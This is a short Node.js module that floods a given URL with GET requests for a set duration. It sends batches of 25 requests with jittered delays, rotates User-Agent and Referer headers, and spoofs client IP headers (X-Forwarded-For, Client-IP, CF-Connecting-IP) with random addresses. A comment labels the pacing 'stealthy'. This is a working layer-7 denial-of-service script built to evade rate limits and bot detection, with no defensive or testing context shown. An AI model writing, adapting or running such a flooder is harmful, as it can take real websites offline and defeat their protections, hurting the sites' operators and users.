const { http, https } = require("follow-redirects");
const { URL } = require("url");

const userAgents = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X)",
  "Mozilla/5.0 (Linux; Android 11; SM-G991B)",
];

const referers = [
  "https://www.google.com/",
  "https://www.bing.com/",
  "https://twitter.com/",
  "https://t.co/",
];

function randomIP() {
  return Array(4).fill(0).map(() => Math.floor(Math.random() * 256)).join(".");
}

function randomHeaders(hostname) {
  const ip = randomIP();
  return {
    "User-Agent": userAgents[Math.floor(Math.random() * userAgents.length)],
    "Referer": referers[Math.floor(Math.random() * referers.length)] + Math.random().toString(36),
    "X-Forwarded-For": ip,
    "Client-IP": ip,
    "CF-Connecting-IP": ip,
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Upgrade-Insecure-Requests": "1",
    "Connection": "keep-alive"
  };
}

module.exports = function (target, duration) {
  const url = new URL(target);
  const client = url.protocol === "https:" ? https : http;
  const end = Date.now() + duration * 1000;

  function send() {
    const headers = randomHeaders(url.hostname);
    const options = {
      method: "GET",
      hostname: url.hostname,
      path: url.pathname + url.search || "/",
      port: url.port || (url.protocol === "https:" ? 443 : 80),
      headers,
    };

    const req = client.request(options, res => {
      console.log(`[${res.statusCode}] ${res.responseUrl || target}`);
      res.on("data", () => {}); // discard data
    });

    req.on("error", () => {});
    req.end();
  }

  function loop() {
    if (Date.now() >= end) return;
    for (let i = 0; i < 25; i++) send(); // Low concurrency, stealthy
    setTimeout(loop, Math.floor(Math.random() * 200) + 150); // jitter delay
  }

  loop();
};